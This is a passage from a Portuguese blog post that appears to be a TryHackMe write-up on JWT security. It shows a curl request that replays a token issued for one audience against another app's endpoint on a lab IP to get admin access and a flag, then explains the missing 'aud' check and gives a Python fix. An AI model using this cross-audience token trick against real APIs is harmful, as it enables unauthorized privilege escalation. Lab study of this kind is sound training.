+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿estudos<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/alex<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# 
+</span></span><span style="display:flex;"><span>curl -H <span style="color:#e6db74">&#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MSwiYXVkIjoiYXBwQiJ9.jrTcVTGY9VIo-a-tYq_hvRTfnB4dMi_7j98Xvm-xb6o&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>http://10.10.86.110/api/v1.0/example7_appA?username<span style="color:#f92672">=</span>admin
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Welcome admin, you are an admin, here is your flag: THM{f0d34fe1-2ba1-44d4-bae7-99bd555a4128}&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Com isso recebemos nossa <code>flag</code> e é mostrado na prática a falta de verificação, possibilitando uma escalada de privilégios.</p>
+<h3 data-hextra-search-id="desenvolvimento-do-erro-5">Desenvolvimento do erro<span class="hx:absolute hx:-mt-20" id="desenvolvimento-do-erro-5"></span>
+    <a href="#desenvolvimento-do-erro-5" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Não existe verificação no campo <code>aud</code> , isso pode ocorrer por desativação ou definição no campo deixando amplo para diversas aplicações.</p>
+<h3 data-hextra-search-id="correção-6">Correção<span class="hx:absolute hx:-mt-20" id="correção-6"></span>
+    <a href="#corre%c3%a7%c3%a3o-6" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Conforme a lição menciona, o payload do JWT deve ser checado após decodificação, exemplo de código de checagem.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>decode(token, self<span style="color:#f92672">.</span>secret, audience<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;appA&#34;</span>], algorithms<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;HS256&#34;</span>)</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<h2 data-hextra-search-id="conclusão">Conclusão<span class="hx:absolute hx:-mt-20" id="conclusão"></span>
+    <a href="#conclus%c3%a3o" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>A aula aborda assuntos importantes sobre JSON Web Token (JWT), explicando seu propósito e informando sobre os principais algoritmos utilizados para a segurança do token. Há um aprofundamento nas falhas de implementações, destacando vulnerabilidades na prática. Assim, consolida-se o conhecimento sobre o funcionamento do JWT e como aplicar boas práticas para garantir a segurança.</p>
+
+          
+        </div>
+        <div class="hx:mt-16"></div>
+        
+        
+      </main>
+    </article>
+  </div>
+
+      <footer class="hextra-footer hx:bg-gray-100 hx:pb-[env(safe-area-inset-bottom)] hx:dark:bg-neutral-900 hx:print:bg-transparent"><div class="hx:mx-auto hx:flex hx:gap-2 hx:py-2 hx:px-4 hextra-max-footer-width"><div class="hx:flex hx:justify-items-start ">
+    <button
+      title="Mudar a língua"
+      data-state="closed"
+      data-location=""
+      class="hextra-language-switcher hx:cursor-pointer hx:rounded-md hx:text-left hx:font-medium hx:h-7 hx:px-2 hx:text-xs hx:text-gray-600 hx:transition-colors hx:dark:text-gray-400 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:grow"
+      type="button"
+      aria-label="Mudar a língua"
+      aria-expanded="false"
+      aria-haspopup="menu"
+    >
+      <div class="hx:flex hx:items-center hx:gap-2 hx:capitalize"><svg height=12 xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9"/></svg><span>Português</span></div>
+    </button>
+    <ul
+      class="hextra-language-options hx:hidden hx:z-20 hx:max-h-64 hx:overflow-auto hx:rounded-lg hx:border hx:border-gray-200 hx:bg-white hx:p-1 hx:text-sm hx:shadow-lg hx:dark:border-neutral-700 hx:dark:bg-neutral-900"
+      style="position: fixed; inset: auto auto 0px 0px; margin: 0px; min-width: 100px;"
+      role="menu"
+    >
+      <li role="none" class="hx:flex hx:flex-col">
+          <a
+            href="/posts/2025/2025-01-05-jwt-security/"
+            role="menuitem"
+            class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9"
+          >Português<span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span></a>
+        </li>
+      <li role="none" class="hx:flex hx:flex-col">
+          <a
+            href="/en/"
+            role="menuitem"
+            class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9"
+          >English</a>
+        </li>
+      </ul>
+  </div><div class="hx:flex hx:justify-items-start hx:group" data-theme="light">
+  <button
+    title="Mudar tema"
+    data-state="closed"
+    data-location="bottom"
+    class="hextra-theme-toggle hx:cursor-pointer hx:rounded-md hx:text-left hx:font-medium hx:h-7 hx:px-2 hx:text-xs hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:font-medium hx:text-gray-600 hx:transition-colors hx:dark:text-gray-400 hx:grow"
+    type="button"
+    aria-label="Mudar tema"
+    aria-expanded="false"
+    aria-haspopup="menu"
+  >
+    <div class="hx:flex hx:items-center hx:gap-2 hx:capitalize"><svg height=12 class="hx:group-data-[theme=dark]:hidden hx:group-data-[theme=system]:hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"/></svg><span class="hx:group-data-[theme=dark]:hidden hx:group-data-[theme=system]:hidden">Claro</span><svg height=12 class="hx:group-data-[theme=light]:hidden hx:group-data-[theme=system]:hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"/></svg><span class="hx:group-data-[theme=light]:hidden hx:group-data-[theme=system]:hidden">Escuro</span><svg height=12 class="hx:group-data-[theme=dark]:hidden hx:group-data-[theme=light]:hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"  fill="currentColor">
+  <path d="M 11.996094,2 C 6.4986225,2.0192368 2.03125,6.5024993 2.03125,12 c 0,5.497501 4.4673725,9.980763 9.964844,10 H 12 12.0039 c 5.497471,-0.01924 9.964844,-4.502499 9.964844,-10 0,-5.4975007 -4.467373,-9.9807632 -9.964844,-10 H 12 Z M 12,4 c 4.417218,0.017598 7.96875,3.5822356 7.96875,8 0,4.417764 -3.551532,7.982402 -7.96875,8 z" />
+</svg>
+<span class="hx:group-data-[theme=dark]:hidden hx:group-data-[theme=light]:hidden">Sistema</span></div>
+  </button>
+  <ul
+    class="hextra-theme-toggle-options hx:hidden hx:z-20 hx:max-h-64 hx:overflow-auto hx:rounded-lg hx:border hx:border-gray-200 hx:bg-white hx:p-1 hx:text-sm hx:shadow-lg hx:dark:border-neutral-700 hx:dark:bg-neutral-900"
+    style="position: fixed; inset: auto auto 0px 0px; margin: 0px; min-width: 100px;"
+    data-theme="light"
+    role="menu"
+  >
+    <li role="none" class="hx:flex hx:flex-col">
+      <button
+        type="button"
+        role="menuitemradio"
+        aria-checked="true"
+        tabindex="-1"
+        data-item="light"
+        class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9 hx:text-left hx:w-full hx:bg-transparent hx:border-0"
+      >
+        Claro
+         <span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3 hx:group-data-[theme=dark]:hidden hx:group-data-[theme=system]:hidden"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span>
+      </button>
+    </li>
+    <li role="none" class="hx:flex hx:flex-col">
+      <button
+        type="button"
+        role="menuitemradio"
+        aria-checked="false"
+        tabindex="-1"
+        data-item="dark"
+        class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9 hx:text-left hx:w-full hx:bg-transparent hx:border-0"
+      >
+        Escuro
+         <span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3 hx:group-data-[theme=light]:hidden hx:group-data-[theme=system]:hidden"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span>
+      </button>
+    </li>
+    <li role="none" class="hx:flex hx:flex-col">
+      <button
+        type="button"
+        role="menuitemradio"
+        aria-checked="false"
+        tabindex="-1"
+        data-item="system"
+        class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9 hx:text-left hx:w-full hx:bg-transparent hx:border-0"
+      >
+        Sistema
+         <span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3 hx:group-data-[theme=dark]:hidden hx:group-data-[theme=light]:hidden"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span>
+      </button>
+    </li>
+  </ul>
+</div>
+</div><hr class="hx:border-gray-200 hx:dark:border-neutral-800" /><div class="hextra-custom-footer hextra-max-footer-width hx:mx-auto hx:pl-[max(env(safe-area-inset-left),1.5rem)] hx:pr-[max(env(safe-area-inset-right),1.5rem)] hx:text-gray-600 hx:dark:text-gray-400"></div><div
+      class="hextra-max-footer-width hx:mx-auto hx:flex hx:justify-center hx:py-12 hx:pl-[max(env(safe-area-inset-left),1.5rem)] hx:pr-[max(env(safe-area-inset-right),1.5rem)] hx:text-gray-600 hx:dark:text-gray-400 hx:md:justify-start"
+    >
+      <div class="hx:flex hx:w-full hx:flex-col hx:items-center hx:sm:items-start"><div class="hx:font-semibold"><a class="hx:flex hx:text-sm hx:items-center hx:gap-1 hx:text-current" target="_blank" rel="noopener noreferrer" title="Hextra GitHub Homepage" href="https://github.com/imfing/hextra">
+    <span>Com a tecnologia de Hextra<svg height=1em class="hx:inline-block hx:ltr:ml-1 hx:rtl:mr-1 hx:align-[-2.5px]" viewBox="0 0 180 180" xmlns="http://www.w3.org/2000/svg" fill="currentColor"><path fill-rule="evenodd" clip-rule="evenodd" d="m 105.50024,22.224647 c -9.59169,-5.537563 -21.40871,-5.537563 -31.000093,0 L 39.054693,42.689119 C 29.463353,48.226675 23.55484,58.460531 23.55484,69.535642 v 40.928918 c 0,11.07542 5.908513,21.3092 15.499853,26.84652 l 35.445453,20.46446 c 9.591313,5.53732 21.408404,5.53732 31.000094,0 l 35.44507,-20.46446 c 9.59131,-5.53732 15.49985,-15.7711 15.49985,-26.84652 V 69.535642 c 0,-11.075111 -5.90854,-21.308967 -15.49985,-26.846523 z M 34.112797,85.737639 c -1.384445,2.397827 -1.384445,5.352099 0,7.749927 l 24.781554,42.922974 c 1.38437,2.39783 3.942853,3.87496 6.711592,3.87496 h 49.563107 c 2.76905,0 5.3273,-1.47713 6.71144,-3.87496 l 24.78194,-42.922974 c 1.38414,-2.397828 1.38414,-5.3521 0,-7.749927 L 121.88049,42.814746 c -1.38414,-2.397828 -3.94239,-3.874964 -6.71144,-3.874964 H 65.605944 c -2.768739,0 -5.327223,1.477059 -6.711592,3.874964 z" style="stroke-width:0.774993" /></svg></span>
+  </a></div></div>
+    </div></footer>
+    
+    <dialog
+    id="hextra-search-dialog"
+    class="hextra-search-dialog"
+    aria-label="Procurar..."
+  >
+    <div class="hextra-search">
+      <div class="hextra-search-input-wrapper"><svg class="hextra-search-input-icon" focusable="false" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg><input
+          class="hextra-search-input"
+          type="search"
+          role="combobox"
+          autocomplete="off"
+          autocorrect="off"
+          autocapitalize="off"
+          spellcheck="false"
+          placeholder="Procurar..."
+          aria-label="Procurar..."
+          aria-controls="hextra-search-results"
+          aria-expanded="false"
+        /><button
+          type="button"
+          class="hextra-search-input-kbd"
+          data-search-close
+          aria-label="Close"
+        >ESC</button>
+      </div>
+      <div class="hextra-search-results-viewport" data-search-viewport>
+        <div class="hextra-search-results-inner hextra-scrollbar" data-search-inner>
+          <ul
+            id="hextra-search-results"
+            class="hextra-search-results"
+            role="listbox"
+            aria-label="Resultados da pesquisa"
+          ></ul>
+          <div class="hextra-search-empty" data-search-empty hidden>Nenhum resultado encontrado</div>
+        </div>
+      </div>
+      <div class="hextra-search-status hx:sr-only" aria-live="polite" role="status"></div>
+    </div>
+  </dialog>
+    <script defer src="/js/main.js" integrity=""></script>
+<script defer src="/js/flexsearch.9f5b5908f93ae86f1ecd4b043b799f580c2d1654e703dd9357d568ac41b2547a.js" integrity="sha256-n1tZCPk66G8ezUsEO3mfWAwtFlTnA92TV9VorEGyVHo=" crossorigin="anonymous"></script><script defer src="/pt.search.js" integrity=""></script>
+    <script defer src="/pt.search-dialog.js" integrity=""></script>
+  </body>
+</html>
